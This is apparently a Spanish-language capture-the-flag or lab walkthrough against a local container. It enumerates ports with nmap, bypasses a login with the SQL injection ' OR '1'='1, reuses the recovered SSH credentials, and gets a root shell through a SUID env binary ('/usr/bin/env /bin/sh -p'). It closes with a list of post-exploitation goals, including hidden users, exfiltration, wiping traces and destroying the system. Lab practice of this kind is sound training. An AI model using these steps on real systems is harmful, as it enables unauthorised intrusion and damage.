# Informe de Enumeración y Escalada de Privilegios

## 1. Comprobar Conexión

```bash
ping 172.17.0.2
```

---

## 2. Escaneo de Puertos Abiertos

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
```

| Opción           | Descripción                                             |
|------------------|---------------------------------------------------------|
| `-p-`            | Escanea todos los puertos TCP (1-65535).                |
| `--open`         | Muestra solo los puertos abiertos.                      |
| `-sS`            | Escaneo SYN (stealth), más discreto.                   |
| `--min-rate 5000`| Envía al menos 5000 paquetes por segundo.              |
| `-vvv`           | Muestra detalles extensos del escaneo.                 |
| `-n`             | No resuelve nombres DNS (más rápido).                  |
| `-Pn`            | Omite el ping inicial (útil si ICMP está bloqueado).   |

✅ **Puertos abiertos**: 22 (SSH) y 80 (HTTP)

---

## 3. Detección de Versiones de Servicios

```bash
nmap -p22,80 -sCV 172.17.0.2
```

| Opción  | Descripción                                                   |
|---------|---------------------------------------------------------------|
| `-p22,80` | Escanea puertos específicos (SSH y HTTP).                    |
| `-sC`   | Ejecuta scripts por defecto (detección de servicios, banners).|
| `-sV`   | Intenta identificar versiones de los servicios.               |

**Resultados:**

- `22/tcp open ssh` → OpenSSH 8.9p1 Ubuntu 3ubuntu0.6  
- `80/tcp open http` → Apache httpd 2.4.52 (Ubuntu)

---

## 4. Prueba de Credenciales Comunes

```
admin:admin  
user:password  
root:root  
root:toor  
```

❌ **Ninguna credencial fue válida.**

---

## 5. Prueba de Inyección SQL

Al ingresar `' OR '1'='1` en el formulario de login, se accedió al sistema.

✅ **Acceso exitoso. Se obtuvieron credenciales:**

```
Usuario: Dylan  
Contraseña: KJSDFG789FGSDF78  
```

---

## 6. Acceso SSH

> **Importante**: el nombre de usuario debe ir en minúsculas.

```bash
ssh dylan@172.17.0.2
```

✅ **Acceso SSH exitoso.**

---

## 7. Búsqueda de Archivos con Permisos SUID

```bash
find / -perm -4000 -type f 2>/dev/null
```

| Opción         | Descripción                                       |
|----------------|---------------------------------------------------|
| `/`            | Búsqueda desde la raíz del sistema.               |
| `-perm -4000`  | Busca archivos con el bit SUID activado.          |
| `-type f`      | Solo archivos.                                    |
| `2>/dev/null`  | Suprime mensajes de error.                        |

**Resultados relevantes:**

```bash
/usr/bin/env
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/su
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
...
```

🔍 Archivos como `/usr/bin/env` pueden ser aprovechados para escalar privilegios.

| Binario                                | Riesgo / Uso potencial                        | ¿Explotable? |
|----------------------------------------|-----------------------------------------------|--------------|
| `/usr/bin/passwd`                      | Cambia contraseñas.                           | 🔒 No         |
| `/usr/bin/chsh`, `/usr/bin/chfn`      | Cambia shell o info del usuario.              | 🔒 No         |
| `/usr/bin/su`                          | Requiere contraseña.                          | 🔒 No         |
| `/usr/bin/env`                         | Ejecuta comandos con entorno limpio.          | ✅ ¡Sí!       |

---

## 8. Escalada de Privilegios con `env`

```bash
/usr/bin/env /bin/sh -p
```

| Parte            | Explicación                                               |
|------------------|-----------------------------------------------------------|
| `/usr/bin/env`   | Ejecuta un programa con un entorno controlado.           |
| `/bin/sh`        | Shell estándar.                                          |
| `-p`             | Conserva los privilegios del ejecutable SUID.            |

✅ **Se obtiene una shell como root.**

---

## 9. Post-explotación

Una vez con acceso como root, se pueden realizar las siguientes acciones:

- ✅ Mantener el acceso (persistencia)  
- 👤 Crear un usuario oculto  
- 🔐 Añadir una clave pública SSH  
- 📦 Exfiltración de información  
- 🌐 Exploración de la red interna  
- 🔀 Pivoting hacia otras máquinas  
- 🧹 Eliminación de huellas  
- 💣 Destrucción del sistema (opcional y maliciosa)
